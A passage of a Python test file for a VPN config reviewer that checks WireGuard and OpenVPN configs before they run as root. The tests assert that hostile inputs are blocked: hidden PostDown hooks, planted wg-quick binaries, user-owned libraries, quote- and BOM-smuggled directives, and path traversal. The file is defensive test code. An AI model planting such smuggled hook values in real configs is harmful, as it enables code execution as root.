def test_dns_entries_are_split_and_sorted_as_wg_quick_does():
    s = _inspect("DNS = 10.64.0.1 10.64.0.2, corp.example,fd00::53\n")
    assert s.dns_servers == ("10.64.0.1", "10.64.0.2", "fd00::53")
    assert s.dns_search == ("corp.example",)


def test_a_non_ascii_space_makes_a_dns_entry_a_search_domain():
    s = _inspect("DNS = 10.64.0.1 \n")
    assert s.dns_servers == () and s.dns_search == ("10.64.0.1 ",)


@pytest.mark.parametrize("entry", ["10.64.0.*", "10.64.0.?", "[1]0.64.0.1", "@(x)", "+(1)", "!(1)"])
def test_a_wildcard_in_dns_is_listed_as_neither_kind(entry):
    """PR #34 review (Sourcery): wg-quick's shell may expand it (extglob is on)."""
    s = _inspect(f"DNS = {entry}, 10.64.0.9\n")
    assert s.dns_servers == ("10.64.0.9",) and s.dns_search == ()
    assert s.dns_wildcards == (entry,)


def test_a_wildcard_in_dns_blocks_a_connect_and_never_claims_system_dns(tmp_path):
    """Independent review of #34, P2-1: a file named like a DNS address in the
    directory wg-quick runs in would choose the DNS server as root."""
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS = 10.64.0.*\n")))
    assert _blocked(r, "DNS line has an entry with a wildcard (10.64.0.*)")
    assert "DNS: Unknown — an entry has a wildcard" in r.config_lines
    assert not any("system DNS stays in use" in line for line in r.config_lines)


def test_padding_cannot_push_the_dns_warnings_out_of_the_cap(tmp_path):
    """Independent review of #34, P2-2: ignored lines are one warning per kind."""
    junk = "".join(f"junk{n}\n" for n in range(25))
    s = _inspect(junk + "Address = 10.8.0.*\nDNS # = 10.64.0.1\n" + junk)
    assert s.warnings[0].startswith("Line ") and "'=' comes after a '#'" in s.warnings[0]
    assert any(w.startswith("Lines 3, 4, 5") and "has no '='" in w for w in s.warnings)
    assert len(s.warnings) < 6


def test_search_domains_without_a_dns_server_are_said_not_to_apply(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS = corp.example\n")))
    assert any(line.startswith("DNS search domains: corp.example (not applied")
               for line in r.config_lines)
    r = review("connect", profile_for(wg_conf(
        tmp_path, "wg2", interface_extra="DNS = 10.64.0.1, corp.example\n")))
    assert "DNS search domains: corp.example" in r.config_lines


@pytest.mark.parametrize("line", ["DNS_ = 1.1.1.1", "D-NS = 1.1.1.1", "D NS = 1.1.1.1"])
def test_only_the_key_wg_quick_reads_sets_dns(line):
    """Independent review of #34, P3-5: wg-quick compares the trimmed key to DNS."""
    assert _inspect(line + "\n").dns_servers == ()
    assert _inspect("  dns  = 1.1.1.1\n").dns_servers == ("1.1.1.1",)


def test_allowed_ips_keys_are_read_as_wg_reads_them():
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n[Peer]\n"
                               "Allowed IPs = 10.0.0.0/8\n", Path("x.conf"))
    assert s.allowed_ips == ("10.0.0.0/8",)                  # wg setconf drops the blank


def test_a_wildcard_in_address_is_warned_about():
    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.*\n[Peer]\n"
                               "AllowedIPs = 0.0.0.0/0\n", Path("x.conf"))
    assert any("Address entry contains a wildcard" in w for w in s.warnings)


def test_a_config_full_of_bad_entries_gives_a_short_list_of_warnings():
    """PR #34 review (Sourcery): one warning per bad token flooded the dialog."""
    s = _inspect("Address = " + "x " * 5000 + "\nDNS = " + "1.* " * 5000 + "\n"
                 + "junk\n" * 5000)
    assert len(s.warnings) <= 21
    assert len(set(s.warnings)) == len(s.warnings)


def test_more_than_twenty_kinds_of_warning_are_capped():
    from agents.vpn_agent.services import config_inspection
    capped = config_inspection._capped([f"w{n}" for n in range(30)] + ["w0"])
    assert len(capped) == 21 and capped[-1] == "… and 10 more warnings about this file."


def test_the_review_shows_search_domains_and_says_system_dns_stays(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS = corp.example\n")))
    assert "DNS: Not specified — system DNS stays in use" in r.config_lines
    assert any(line.startswith("DNS search domains: corp.example") for line in r.config_lines)


# ── S7 review follow-ups (docs/audit/s7-wireguard-root-copy-*-2026-11-05.md) ──

def test_a_wg_quick_the_user_can_replace_draws_a_warning_not_a_blocker(tmp_path, monkeypatch):
    # Owner decision 2026-11-05: warn, do not block (Homebrew's bin is the user's).
    exe = tmp_path / "bin" / "wg-quick"
    exe.parent.mkdir()
    exe.write_text("#!/bin/bash\n")
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: str(exe) if name == "wg-quick" else real_which(name, *a, **k))
    for action, probe in (("connect", Probe()), ("disconnect", Probe(up={"wgnl"}))):
        r = review(action, profile_for(wg_conf(tmp_path)), probe)
        assert r.allowed, r.blockers
        found = [w for w in r.warnings if w.startswith(f"wg-quick runs as administrator from {exe}")]
        assert found and "not owned by root" in found[0]
        assert "protects the config file, not these tools" in found[0]


def test_a_root_owned_wg_quick_draws_no_such_warning(tmp_path, monkeypatch):
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: "/bin/ls" if name == "wg-quick" else real_which(name, *a, **k))
    r = review("connect", profile_for(wg_conf(tmp_path)))
    assert not [w for w in r.warnings if w.startswith("wg-quick runs as administrator")]


def test_a_wireguard_disconnect_says_the_kept_copy_may_be_what_runs(tmp_path):
    p = profile_for(wg_conf(tmp_path, interface_extra="PostDown = echo bye\n"))
    r = review("disconnect", p, Probe(up={"wgnl"}))
    text = r.confirmation_text()
    assert "only if Sentinel kept no copy at Connect" in text
    assert "copy you connected with runs" in text
    assert "this config executes:" not in text
    assert "SHA-256 of your config file now" in r.confirmation_detail()
    assert any(title == "Runs commands as administrator (your file now)"
               for title, _, _ in r.sections())
    assert any("Disconnect runs that copy" in w for w in r.warnings)
    # Connect is unchanged: what is shown is what runs.
    c = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")))
    assert "RUNS COMMANDS AS ADMINISTRATOR — this config executes:" in c.confirmation_text()
    assert not any("Disconnect runs that copy" in w for w in c.warnings)


def test_a_config_not_named_interface_conf_is_refused_before_the_prompt(tmp_path):
    path = tmp_path / "wg0.txt"
    path.write_text(wg_conf(tmp_path).read_text())
    p = {**profile_for(wg_conf(tmp_path)), "config_path": str(path)}
    r = review("connect", p)
    assert any("is not named <interface>.conf" in b for b in r.blockers)
    runner = Recorder()
    outcome = run("connect", p, runner, r)
    assert outcome.ran is False and runner.scripts == []


def test_an_interface_only_disconnect_with_no_file_says_nothing_else_runs():
    r = review("disconnect", {"name": "Bare", "protocol": "WireGuard",
                              "endpoint": "203.0.113.7", "interface": "wgzz"},
               Probe(up={"wgzz"}))
    assert r.command.endswith("(the copy kept since Connect; without one, nothing runs)")


def test_a_non_utf8_config_never_reaches_root_as_verified_on_disconnect(tmp_path, monkeypatch):
    """c1c5178 review P1-2, ported: hidden hooks in bytes the review could not
    decode were hashed anyway, so a Disconnect with no copy kept since Connect
    had root copy those bytes and run their PostDown. Now no hash travels: root
    uses its kept copy, or refuses (exit 96) when there is none (both pinned in
    tests/test_vpn_rootscript.py)."""
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k:
                        "/bin/ls" if name == "wg-quick" else real_which(name, *a, **k))
    path = wg_conf(tmp_path)
    path.write_bytes(path.read_bytes() + b"PostDown = /tmp/evil \xff\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgnl"}))
    assert r.config_sha256 == ""
    # S7 rebase review P3-1: the dialog does not promise a verified fallback.
    assert r.command.endswith("(the copy kept since Connect; without one, nothing runs)")
    assert r.allowed and any("not readable UTF-8" in risk for risk in r.risks)
    runner = Recorder()
    outcome = run("disconnect", profile_for(path), runner, r, Probe(up={"wgnl"}))
    assert outcome.ran is True
    # The same command either way: root alone knows whether a copy is kept.
    assert runner.scripts == [vpn_rootscript.wireguard_command("down", "", "", "wgnl", "/bin/ls")]
    assert "\xff" not in runner.scripts[0] and str(path) not in runner.scripts[0]


def test_a_missing_config_on_disconnect_promises_no_verified_fallback(tmp_path):
    path = wg_conf(tmp_path)
    path.unlink()
    r = review("disconnect", profile_for(path), Probe(up={"wgnl"}))
    assert r.config_sha256 == ""
    assert r.command.endswith("(the copy kept since Connect; without one, nothing runs)")


@pytest.mark.parametrize("target", ["sub/wgnl.conf", "~/wgnl.conf", "/Users/me/wgnl.conf"])
def test_a_disconnect_of_any_config_path_says_root_verifies_the_file(target):
    """S7 rebase review P3-2: a relative or ~ path is sent to root with its hash,
    so the summary must not say nothing runs."""
    assert "check its SHA-256 first" in vpn_connection.wg_root_summary("down", target)
    assert "nothing runs" in vpn_connection.wg_root_summary("down", "wgnl")


def test_root_runs_the_wg_quick_the_review_judged(tmp_path, monkeypatch):
    """S7 security review P2-A: a wg-quick put earlier on PATH after the dialog
    changes the review, so nothing runs; unchanged, root gets the judged path."""
    real_which = vpn_connection.shutil.which
    found = {"wg-quick": "/bin/ls"}
    which = lambda name, *a, **k: found.get(name) or real_which(name, *a, **k)
    monkeypatch.setattr(vpn_connection.shutil, "which", which)
    monkeypatch.setattr(vpn_execution.shutil, "which", which)
    p = profile_for(wg_conf(tmp_path))
    confirmed = review("connect", p)
    assert confirmed.wg_quick == "/bin/ls"
    found["wg-quick"] = str(tmp_path / "planted" / "wg-quick")
    runner = Recorder()
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []
    found["wg-quick"] = "/bin/ls"
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is True
    assert runner.scripts == [vpn_rootscript.wireguard_command(
        "up", p["config_path"], confirmed.config_sha256, "wgnl", "/bin/ls")]


def test_the_runner_uses_the_wg_quick_it_is_given_not_a_fresh_lookup(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k: "/tmp/planted/wg-quick")
    runner = Recorder()
    vpn_connection.connect({"protocol": "WireGuard", "endpoint": "203.0.113.7",
                            "config_path": "/Users/me/wg0.conf"},
                           run_as_root=runner, config_sha256="a" * 64, wg_quick="/bin/ls")
    assert runner.scripts == [vpn_rootscript.wireguard_command(
        "up", "/Users/me/wg0.conf", "a" * 64, "wg0", "/bin/ls")]
    runner = Recorder()
    vpn_connection.connect({"protocol": "WireGuard", "endpoint": "203.0.113.7",
                            "config_path": "/Users/me/wg0.conf"},
                           run_as_root=runner, config_sha256="a" * 64, wg_quick="")
    assert runner.scripts == []          # no wg-quick was reviewed: nothing runs


@pytest.mark.parametrize("action, probe", [("connect", Probe()), ("disconnect", Probe(up={"wgnl"}))])
def test_execute_hands_the_runner_the_reviewed_wg_quick(tmp_path, monkeypatch, action, probe):
    """A lookup between the fresh review and the run (P2-A's window) must not
    matter: execute passes the judged path, the runner does no lookup of its own."""
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which", lambda name, *a, **k:
                        "/bin/ls" if name == "wg-quick" else real_which(name, *a, **k))
    seen = {}
    monkeypatch.setattr(vpn_connection, action, lambda profile, **kw: seen.update(kw)
                        or {"success": True, "output": ""})
    p = profile_for(wg_conf(tmp_path))
    confirmed = review(action, p, probe)
    assert run(action, p, Recorder(), confirmed, probe).ran is True
    assert seen["wg_quick"] == "/bin/ls" == confirmed.wg_quick


@pytest.mark.parametrize("config_path", ["wgnl", "wgnl.txt", "sub/wgnl"])
def test_a_config_path_not_named_interface_conf_is_blocked_even_without_a_folder(
        tmp_path, monkeypatch, config_path):
    """S7 Opus audit P3-5: "wgnl" passed as a bare interface name, then the
    runner made it a path and refused after the dialog, forever."""
    monkeypatch.chdir(tmp_path)
    (tmp_path / "sub").mkdir()
    (tmp_path / config_path).write_text(wg_conf(tmp_path).read_text())
    p = {**profile_for(wg_conf(tmp_path)), "config_path": config_path}
    r = review("connect", p)
    assert any("is not named <interface>.conf" in b for b in r.blockers)


# ── S8b: OpenVPN data files, hook programs and directives (ported) ──
# Ported from the S8b branch (a4997c8) onto the rewritten S8b code. WireGuard
# cases are left out: the owner's allowlist (2026-11-06) above supersedes them.

def ovpn_files(tmp_path, body, files, name="home"):
    """An .ovpn plus the data files it names, written beside it."""
    for rel, data in files.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    return ovpn(tmp_path, body, name)


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _root_owned_tree(monkeypatch, root: Path, files=()):
    """Everything under `root` (and its parents) reads as root-owned."""
    real_stat = os.stat

    def stat_(path, *a, **k):
        text = str(path)
        if text == str(root) or text.startswith(str(root) + "/") or str(root).startswith(text):
            if not os.path.lexists(path) and text not in files:
                raise FileNotFoundError(path)
            kind = stat.S_IFREG if (os.path.isfile(path) or text in files) else stat.S_IFDIR
            return types.SimpleNamespace(st_uid=0, st_mode=kind | 0o755)
        return real_stat(path, *a, **k)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)


def _root_program(tmp_path, monkeypatch, name="hook"):
    """A real file under a folder that reads as root-owned, and a user-owned
    evil.sh beside that folder. The ported tests named /opt/sentinel-test/...,
    which does not exist, and a missing hook program is now a blocker of its own."""
    prog = tmp_path / "root" / name
    prog.parent.mkdir()
    prog.write_text("x")
    user = tmp_path / "user" / "evil.sh"
    user.parent.mkdir()
    user.write_text("x")
    _root_owned_tree(monkeypatch, tmp_path / "root")
    return prog, user


# ── every file the OpenVPN config reads is in the reviewed manifest ──

def test_relative_data_files_are_named_with_their_hash(tmp_path):
    body = ("ca certs/ca.crt\ncert ./certs/me.crt\nkey 'my keys/me.key'\n"
            "tls-auth ta.key 1\nauth-user-pass creds.txt\n")
    files = {"certs/ca.crt": b"CA", "certs/me.crt": b"ME", "my keys/me.key": b"K",
             "ta.key": b"TA", "creds.txt": b"u\np\n"}
    r = review("connect", profile_for(ovpn_files(tmp_path, body, files)))
    assert r.allowed, r.blockers
    assert r.includes == (("certs/ca.crt", digest(b"CA")), ("certs/me.crt", digest(b"ME")),
                          ("my keys/me.key", digest(b"K")), ("ta.key", digest(b"TA")),
                          ("creds.txt", digest(b"u\np\n")))


@pytest.mark.parametrize("line", [
    "dh certs/dh.pem", "tls-crypt certs/ta.key", "tls-crypt-v2 certs/ta.key", "pkcs12 certs/p.p12",
    "crl-verify certs/crl.pem", "extra-certs certs/x.pem", "askpass certs/pw.txt",
    "secret certs/static.key 0", "http-proxy-user-pass certs/proxy.txt",
    "http-proxy proxy.example 8080 certs/proxy.txt basic", "--CA certs/x.pem",
])
def test_each_file_directive_is_in_the_manifest(tmp_path, line):
    ref = next(word for word in line.split() if word.startswith("certs/"))
    r = review("connect", profile_for(ovpn_files(tmp_path, line + "\n", {ref: b"x"})))
    assert r.allowed, r.blockers
    assert [p for p, _ in r.includes] == [ref]


@pytest.mark.parametrize("body", [
    "<ca>\n-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n</ca>\n",
    "auth-user-pass\n", "askpass\n",
    # "[inline]" only beside its block: on its own OpenVPN 2.6 opens a file of that name.
    "ca [inline]\n<ca>\nMIIB\n</ca>\n",
    "http-proxy proxy.example 8080 auto\n", "http-proxy proxy.example 8080\n",
    "dh none\n",                                        # ECDH only: no file
])
def test_inline_blocks_and_promptless_directives_name_no_file(tmp_path, body):
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert r.includes == () and r.allowed, r.blockers


def test_a_file_named_twice_is_listed_once(tmp_path):
    r = review("connect", profile_for(ovpn_files(
        tmp_path, "ca ca.crt\nextra-certs ./ca.crt\n", {"ca.crt": b"CA"})))
    assert r.includes == (("ca.crt", digest(b"CA")),)


def test_an_absolute_file_root_owns_is_named_and_checked_in_place(tmp_path, monkeypatch):
    other = tmp_path / "elsewhere"
    other.mkdir()
    (other / "ta.key").write_bytes(b"TA")
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=stat.S_IFREG | 0o644))
    r = review("connect", profile_for(ovpn(tmp_path, f"tls-auth {other / 'ta.key'} 1\n")))
    assert r.allowed, r.blockers
    assert r.includes == ((str(other / "ta.key"), digest(b"TA")),)
    assert any("absolute path" in w and "checked in place" in w for w in r.warnings)


@pytest.mark.parametrize("line", ["tls-auth {f} 1", "auth-user-pass {f}",
                                  "http-proxy 127.0.0.1 8080 {f} basic"])
def test_an_absolute_file_the_user_could_swap_is_a_blocker(tmp_path, line):
    # Security P2-2: after root's check, a user-owned file could become a link to
    # any root-only file, which openvpn would read and send on. Only files beside
    # the config (copied) or owned by root (cannot be swapped) are accepted.
    other = tmp_path / "elsewhere"
    other.mkdir()
    (other / "f").write_bytes(b"u\np\n")
    r = review("connect", profile_for(ovpn(tmp_path, line.format(f=other / "f") + "\n")))
    assert not r.allowed
    assert any(str(other / "f") in b and "beside the config" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("ref", ["../ca.crt", "certs/../../ca.crt", "./../ca.crt", ".."])
def test_a_relative_file_outside_the_config_folder_is_a_blocker(tmp_path, ref):
    inner = tmp_path / "profile"
    inner.mkdir()
    (tmp_path / "ca.crt").write_bytes(b"CA")
    r = review("connect", profile_for(ovpn(inner, f"ca {ref}\n")))
    assert not r.allowed
    assert any("outside the folder" in b for b in r.blockers), r.blockers


def test_a_symlinked_data_file_is_a_blocker(tmp_path):
    (tmp_path / "real.crt").write_bytes(b"CA")
    (tmp_path / "ca.crt").symlink_to(tmp_path / "real.crt")
    r = review("connect", profile_for(ovpn(tmp_path, "ca ca.crt\n")))
    assert any("symbolic link" in b and "ca.crt" in b for b in r.blockers), r.blockers


def test_a_symlinked_folder_that_leaves_the_config_folder_is_a_blocker(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "ca.crt").write_bytes(b"CA")
    inner = tmp_path / "profile"
    inner.mkdir()
    (inner / "certs").symlink_to(outside)
    r = review("connect", profile_for(ovpn(inner, "ca certs/ca.crt\n")))
    assert any("outside the folder" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("kind", ["missing", "directory", "fifo", "oversize"])
def test_a_data_file_that_is_not_a_small_regular_file_is_a_blocker(tmp_path, kind):
    target = tmp_path / "ca.crt"
    if kind == "directory":
        target.mkdir()
    elif kind == "fifo":
        os.mkfifo(target)
    elif kind == "oversize":
        target.write_bytes(b"#" * (vpn_execution.vpn_rootscript.INCLUDE_LIMIT + 1))
    r = review("connect", profile_for(ovpn(tmp_path, "ca ca.crt\n")))
    assert not r.allowed
    expected = {"missing": "does not exist", "directory": "is a folder",
                "fifo": "not a regular file", "oversize": "larger than"}[kind]
    assert any("ca.crt" in b and expected in b for b in r.blockers), r.blockers
    assert r.includes == ()


def test_seventeen_data_files_are_a_blocker(tmp_path):
    limit = vpn_execution.vpn_rootscript.MAX_INCLUDES
    files = {f"f{i}.pem": b"%d" % i for i in range(limit + 1)}
    body = "".join(f"extra-certs f{i}.pem\n" for i in range(limit + 1))
    r = review("connect", profile_for(ovpn_files(tmp_path, body, files)))
    assert not r.allowed
    assert any(f"at most {limit}" in b for b in r.blockers), r.blockers
    ok = review("connect", profile_for(ovpn_files(
        tmp_path, "".join(f"extra-certs f{i}.pem\n" for i in range(limit)), {}, name="ok")))
    assert ok.allowed, ok.blockers
    assert len(ok.includes) == limit


def test_the_manifest_is_in_the_fingerprint(tmp_path):
    import dataclasses
    path = ovpn_files(tmp_path, "ca ca.crt\n", {"ca.crt": b"CA"})
    r = review("connect", profile_for(path))
    assert dataclasses.replace(r, includes=(("ca.crt", "0" * 64),)).fingerprint() != r.fingerprint()
    assert dataclasses.replace(r, includes=()).fingerprint() != r.fingerprint()
    (tmp_path / "ca.crt").write_bytes(b"OTHER CA")
    assert review("connect", profile_for(path)).fingerprint() != r.fingerprint()


def test_the_dialog_and_sections_list_each_data_file_but_not_its_hash(tmp_path):
    # Review P3-4: the hash of a password file can be guessed offline, so no
    # file's hash is shown; it is still in the fingerprint and handed to root.
    r = review("connect", profile_for(ovpn_files(
        tmp_path, "ca ca.crt\nauth-user-pass creds.txt\n", {"ca.crt": b"CA", "creds.txt": b"u\np\n"})))
    shown = r.confirmation_detail() + r.confirmation_text() + "".join(
        body for _, body, _ in r.sections())
    assert "ca.crt" in r.confirmation_detail() and "creds.txt" in r.confirmation_detail()
    assert any("ca.crt" in body for _, body, _ in r.sections())
    assert digest(b"CA") not in shown and digest(b"u\np\n") not in shown


def test_a_data_file_changed_after_confirmation_runs_nothing(tmp_path):
    path = ovpn_files(tmp_path, "ca ca.crt\n", {"ca.crt": b"CA"})
    p = profile_for(path)
    confirmed = review("connect", p)
    (tmp_path / "ca.crt").write_bytes(b"EVIL")
    runner = Recorder()
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []


def test_execute_hands_root_the_confirmed_hash_and_manifest(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_running", lambda: False)
    path = ovpn_files(tmp_path, "ca certs/ca.crt\n", {"certs/ca.crt": b"CA"})
    p = profile_for(path)
    confirmed = review("connect", p)
    runner = Recorder(output="")
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is True
    # The whole line root runs: the config, its confirmed hash, the reviewed
    # openvpn and the manifest (the old test picked these out by position).
    assert runner.scripts == [vpn_rootscript.openvpn_command(
        "up", config=str(path), sha256=confirmed.config_sha256,
        openvpn="/opt/homebrew/sbin/openvpn", includes=(("certs/ca.crt", digest(b"CA")),))]


# ── libraries: engine, providers, pkcs11-providers ──
# The port blocks `engine` outright and accepts only OpenSSL's own names in
# `providers`; a pkcs11-providers library must be absolute and root-owned.

def test_a_library_in_a_user_folder_is_a_blocker(tmp_path):
    # Review P1-1: providers, engine and pkcs11-providers load code as root.
    lib = tmp_path / "evil.dylib"
    lib.write_bytes(b"\xcf\xfa\xed\xfe")
    r = review("connect", profile_for(ovpn(tmp_path, f"providers {lib}\n")))
    assert _blocked(r, repr(str(lib))) and _blocked(r, "OpenSSL would load it"), r.blockers
    r = review("connect", profile_for(ovpn(tmp_path, f"engine {lib}\n", "engine")))
    assert _blocked(r, "'engine' can load a library"), r.blockers
    r = review("connect", profile_for(ovpn(tmp_path, f"pkcs11-providers /usr/lib/ok.so {lib}\n", "p11")))
    assert not r.allowed
    assert any(str(lib) in b and "not owned by root" in b for b in r.blockers), r.blockers
    assert f"pkcs11-providers: /usr/lib/ok.so {lib}" in r.root_hooks


@pytest.mark.parametrize("line", ["engine dynamic", "engine pkcs11", "engine"])
def test_engine_is_a_blocker_whatever_it_names(tmp_path, line):
    assert _blocked(review("connect", profile_for(ovpn(tmp_path, line + "\n"))), "'engine'")


def test_openssls_own_providers_and_a_root_owned_pkcs11_library_are_accepted(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=stat.S_IFREG | 0o755))
    library = tmp_path / "ok.so"        # exists; the faked _stat makes it root-owned
    library.write_text("")
    r = review("connect", profile_for(ovpn(
        tmp_path, f"providers legacy default\npkcs11-providers {library}\n")))
    assert r.allowed, r.blockers
    assert r.root_hooks == (f"pkcs11-providers: {library}",)
    assert r.programs == (str(library),)        # root re-checks it before start


@pytest.mark.parametrize("line", ["providers legacy mymod", "providers ./mods/legacy.dylib",
                                  "providers Legacy"])
def test_a_provider_that_is_not_openssls_own_is_a_blocker(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, "not one of OpenSSL's own providers"), r.blockers


def test_a_relative_library_path_is_a_blocker(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "pkcs11-providers ./mods/p11.dylib\n")))
    assert _blocked(r, "a relative path"), r.blockers


# ── <connection> blocks, capath, replay-persist, two spellings ──

def test_files_inside_a_connection_block_are_reviewed(tmp_path):
    # Review P2-1: lines inside <connection> are live directives, not an inline blob.
    body = ("<connection>\nremote 198.51.100.4 443 tcp\n"
            "http-proxy proxy.example 8080 certs/proxy.txt basic\n</connection>\n")
    r = review("connect", profile_for(ovpn_files(tmp_path, body, {"certs/proxy.txt": b"u\np\n"})))
    assert r.allowed, r.blockers
    assert r.includes == (("certs/proxy.txt", digest(b"u\np\n")),)


def test_a_hook_inside_a_connection_block_is_seen(tmp_path):
    script = tmp_path / "x.sh"
    script.write_text("#!/bin/sh\n")
    r = review("connect", profile_for(ovpn(
        tmp_path, f"<connection>\nremote 198.51.100.4 443\nup {script}\n</connection>\n")))
    assert f"up: {script}" in r.root_hooks and not r.allowed


def test_socks_proxy_password_file_is_in_the_manifest(tmp_path):
    ref = "certs/socks.txt"
    r = review("connect", profile_for(ovpn_files(
        tmp_path, f"socks-proxy 127.0.0.1 1080 {ref}\n", {ref: b"u\np\n"})))
    assert r.allowed, r.blockers
    assert [p for p, _ in r.includes] == [ref]


def test_capath_is_refused_because_a_folder_cannot_be_checked(tmp_path):
    (tmp_path / "cas").mkdir()
    r = review("connect", profile_for(ovpn(tmp_path, "capath cas\n")))
    assert not r.allowed
    assert any("cas" in b and "is a folder" in b for b in r.blockers), r.blockers


def test_replay_persist_is_a_blocker(tmp_path):
    # Review P2-2: root would create or overwrite the named file.
    r = review("connect", profile_for(ovpn(tmp_path, "replay-persist /etc/x\n")))
    assert not r.allowed
    assert any("replay-persist" in b for b in r.blockers), r.blockers


def test_two_spellings_of_one_file_name_are_a_blocker(tmp_path):
    # Review P3-1: the default macOS volume does not tell ca.crt from CA.crt.
    r = review("connect", profile_for(ovpn_files(
        tmp_path, "ca ca.crt\nextra-certs CA.crt\n", {"ca.crt": b"CA"})))
    assert not r.allowed
    assert any("differ only in case" in b for b in r.blockers), r.blockers


def test_two_unicode_spellings_of_one_file_name_are_a_blocker(tmp_path):
    # Security P3-5: APFS treats NFC and NFD spellings as one name.
    import unicodedata
    nfc, nfd = unicodedata.normalize("NFC", "café.crt"), unicodedata.normalize("NFD", "café.crt")
    assert nfc != nfd
    r = review("connect", profile_for(ovpn_files(
        tmp_path, f"ca {nfc}\nextra-certs {nfd}\n", {nfc: b"CA"})))
    assert not r.allowed
    assert any("differ only" in b for b in r.blockers), r.blockers


def test_too_many_files_are_refused_before_any_is_read(tmp_path, monkeypatch):
    # Review P3-2: the count is checked first.
    opened = []
    real_open = vpn_execution.os.open
    monkeypatch.setattr(vpn_execution.os, "open",
                        lambda path, *a, **k: opened.append(path) or real_open(path, *a, **k))
    limit = vpn_execution.vpn_rootscript.MAX_INCLUDES
    files = {f"f{i}.pem": b"x" for i in range(limit + 1)}
    body = "".join(f"extra-certs f{i}.pem\n" for i in range(limit + 1))
    r = review("connect", profile_for(ovpn_files(tmp_path, body, files)))
    assert not r.allowed and not [p for p in opened if str(p).endswith(".pem")]


# ── the line as OpenVPN reads it: BOM, directive names, quotes, backslashes ──

def ovpn_bytes(tmp_path, data: bytes, name="home"):
    path = tmp_path / f"{name}.ovpn"
    path.write_bytes(data)
    return path


@pytest.mark.parametrize("first, needle", [
    ("config /Users/as/other.ovpn", "config"), ("management 127.0.0.1 7505", "management"),
    ("replay-persist /etc/x", "replay-persist"),
])
def test_a_byte_order_mark_does_not_hide_the_first_directive(tmp_path, first, needle):
    # Security P1-1: OpenVPN skips a leading UTF-8 BOM, so the review must too.
    path = ovpn_bytes(tmp_path, b"\xef\xbb\xbf" + first.encode() + b"\nclient\nremote 203.0.113.7 1194\n")
    r = review("connect", profile_for(path))
    assert _blocked(r, needle)


def test_a_byte_order_mark_does_not_hide_a_hook(tmp_path):
    script = tmp_path / "x.sh"
    script.write_text("#!/bin/sh\n")
    path = ovpn_bytes(tmp_path, b"\xef\xbb\xbfup " + str(script).encode() + b"\nclient\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == (f"up: {script}",) and not r.allowed


@pytest.mark.parametrize("line", ["con​fig other.ovpn", "﻿config other.ovpn",
                                  "upа /x", "config_x 1", "-config x"])
def test_a_directive_name_with_unusual_characters_is_a_blocker(tmp_path, line):
    # Second line, so the BOM here is not at the start of the file.
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert not r.allowed, line


@pytest.mark.parametrize("line", [
    'pkcs11-providers "/usr/lib/ssh-keychain.dylib"/Users/as/evil.dylib',
    "up '\"/bin/sh\"/Users/as/evil.sh'",
    'http-proxy "127.0.0.1"8080 /Users/as/creds basic',
    'ca "a"b', 'remote 203.0.113.7"1194"', "ca x'y'",
])
def test_a_quote_touching_other_text_is_a_blocker(tmp_path, line):
    # Security P1-2: OpenVPN ends a token at its closing quote and opens one only
    # at a token's start; Sentinel refuses any line where the two could differ.
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert _blocked(r, "quote"), line


def test_quotes_at_token_boundaries_are_still_fine(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, 'verify-x509-name "CN=vpn example" name\n')))
    assert r.allowed, r.blockers


@pytest.mark.parametrize("line", ["up /usr/bin/true \\#x", "verify-x509-name my\\qname name",
                                  "verify-x509-name name\\",
                                  'verify-x509-name "a\\qb" name', "up \"/usr/bin/true \\\\q\""])
def test_a_backslash_openvpn_would_read_differently_is_a_blocker(tmp_path, line):
    # Re-review R-P3-4: only \\, \" and backslash-space are escapes both agree on.
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert not r.allowed, line


@pytest.mark.parametrize("line, words", [
    ("verify-x509-name \"CN=a \\\"b\\\"\" name", ['CN=a "b"', "name"]),
    ("ca my\\ keys/ca.crt", ["my keys/ca.crt"]),
